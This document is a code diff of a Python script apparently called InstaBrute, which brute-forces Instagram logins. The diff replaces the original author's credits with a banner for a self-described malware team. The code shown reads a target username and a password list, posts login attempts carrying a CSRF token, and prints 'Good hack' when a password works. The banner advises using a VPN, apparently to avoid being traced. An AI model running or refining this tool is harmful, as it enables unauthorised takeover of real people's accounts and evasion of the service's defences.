@@ -7,34 +7,18 @@ CheckVersion = str(sys.version)
 import re
 from datetime import datetime
 
-
-
 print('''
-                               ....                                         
-                                    %                                       
-                                     ^                                      
-                            L                                               
-                            "F3  $r                                         
-                           $$$$.e$"  .                                      
-                           "$$$$$"   "                                      
-     (insta brute force)     $$$$c  /                                       
-        .                   $$$$$$$P                                        
-       ."c                      $$$                                         
-      .$c3b                  ..J$$$$$e                                      
-      4$$$$             .$$$$$$$$$$$$$$c                                    
-       $$$$b           .$$$$$$$$$$$$$$$$r                                   
-          $$$.        .$$$$$$$$$$$$$$$$$$                                   
-           $$$c      .$$$$$$$  "$$$$$$$$$r                                  
+          =================================================
+                   create by ./B7 Team PMC Cyber '
+          =================================================
+                     Author    : ./B7
+                     Instagram : aprizal_febrian
+                     Website   : -------
+                     Comunty   : PMC MALWARE CYBER TEAM
 
-
-Author   : samsesh
-twitter  : _samsesh
-website  : https://samsesh.net
-
-Management depends on vpn software. Please use it before running the tool
-
-           
-           """""""""""""""""""""""""""""""""""""""""" 
+===========================================================================
+ Management depends on vpn software. Please use it before running the tool 
+===========================================================================
 ''')
 
 
@@ -44,7 +28,7 @@ class InstaBrute(object):
         try:
             user = input('username : ')
             Combo = input('passList : ')
-            print('\n----------------------------')
+            print('\n<---------------------------->')
           
         except:
             print(' The tool was arrested exit ')
@@ -91,7 +75,7 @@ class InstaBrute(object):
                 "Referer": "https://www.instagram.com/accounts/login/",
                 "x-csrftoken": csrf
             })
-            print(f'{user}:{pwd}\n----------------------------')
+            print(f'{user}:{pwd}\n<---------------------------->')
     
             if 'authenticated": true' in r.text:
                 print(('' + user + ':' + pwd + ' -> Good hack '))
